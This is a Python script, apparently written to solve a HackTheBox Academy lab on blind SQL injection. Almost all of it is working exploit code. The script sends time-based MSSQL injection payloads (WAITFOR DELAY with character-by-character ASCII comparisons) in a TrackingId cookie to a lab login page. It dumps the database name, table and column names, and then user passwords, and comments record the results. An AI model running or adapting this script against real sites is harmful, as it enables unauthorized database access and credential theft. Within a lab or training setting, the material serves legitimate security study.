#! /usr/bin/env python3
# Created this script to solve the HackTheBox Academy lab called 'Skills Assessment' for the module called 'BLIND SQL INJECTION'
# This script exploits a blind time based sql injection on the TrackingId cookie

import requests
import string
import concurrent.futures

# Create character list
chars= list(range(32,127))

# Create numbers list
nums= list(range(1,40))

# Create Blind time based sql injection function
def sqli():
    target= "10.129.106.20"
    proxies={"http":"http://127.0.0.1:8080"}
    headers={"Content-type":"application/x-www-form-urlencoded"}
    data="e=test@a.com&p=test"
    count=0
    secret=""
    for num in nums:
        if count == 95:
            break
        for char in chars:
            #query=f"'IF%20(ASCII(substring(db_name(),{num},1))={char})%20WAITFOR%20DELAY%20'0:0:4'--%20-" 
                # Above query retrieved database name: d4y
            #query=f"'IF%20(ASCII(substring((SELECT table_name from information_schema.tables where table_catalog='d4y' ORDER BY table_name OFFSET 2 ROWS FETCH NEXT 1 ROWS ONLY),{num},1))={char})%20WAITFOR%20DELAY%20'0:0:4'--%20-" 
                # above query change offset number to dump different rows.  Dumped: captcha, trackingid, users, 
            #query=f"'IF%20(ASCII(substring((SELECT column_name from information_schema.columns where table_name='users' and table_catalog='d4y' ORDER BY column_name OFFSET 0 ROWS FETCH NEXT 1 ROWS ONLY),{num},1))={char})%20WAITFOR%20DELAY%20'0:0:4'--%20-"
                # Above query change offset number to dump different rows.  Dumped: email, password
            query=f"'IF%20(ASCII(substring((SELECT password from users),{num},1))={char})%20WAITFOR%20DELAY%20'0:0:4'--%20-" 
            cookies= {"PHPSESSID":"sgm1rktemjonb0bao4elfttmet",
                    "TrackingId":f"{query}"}
            response= requests.post(url=f"http://{target}/login.php", proxies=proxies, headers=headers, data=data, cookies=cookies, allow_redirects=True)

            if response.elapsed.total_seconds() > 3:
                print(chr(char))
                count=0
                secret+=chr(char)
                break                
            else:
                count+=1                
    print(f"Finished, the information retrieved from the database is: {secret}")

try:
    sqli()
except KeyboardInterrupt:
    print("ctrl+c detected, exiting gracefully")
